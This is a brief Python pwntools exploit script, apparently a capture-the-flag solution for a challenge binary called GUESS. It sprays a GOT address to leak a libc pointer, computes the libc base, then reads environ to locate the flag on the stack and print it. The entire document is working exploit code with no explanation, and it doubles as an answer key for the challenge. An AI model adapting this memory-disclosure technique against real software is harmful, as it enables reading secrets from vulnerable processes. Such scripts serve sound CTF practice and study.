from pwn import *

DEBUG=0

p=process('./GUESS')
#p=remote('106.75.90.160',9999)

if DEBUG==1:
  context.log_level='debug'
  gdb.attach(p)

leak_addr=0x602020

p.recv()

p.sendline(p64(leak_addr)*38)

#p.recv()
#p.recv()

p.recvuntil(': ')
libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x6f690

log.info(hex(libc_base))
environ=libc_base+0x3C6F38

p.sendline(p64(environ)*38)
p.recvuntil(': ')
flag_addr=u64(p.recv(6).ljust(8,'\x00'))-0x168

log.info(hex(flag_addr))

p.sendline(p64(flag_addr)*38)
p.recvuntil(': ')
print p.recvline()

